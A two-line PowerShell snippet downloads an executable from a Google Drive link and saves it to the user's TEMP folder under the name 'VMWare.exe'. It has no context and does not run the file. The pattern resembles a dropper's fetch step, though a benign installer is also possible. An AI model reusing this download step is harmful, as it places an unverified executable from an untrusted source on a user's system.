$zipFile = "https://drive.google.com/uc?export=download&id=1D48LSmtMrPUrsuehqYZJDLqdFqZMuik"
Invoke-WebRequest -Uri $zipFile -OutFile "$($env:TEMP)\VMWare.exe"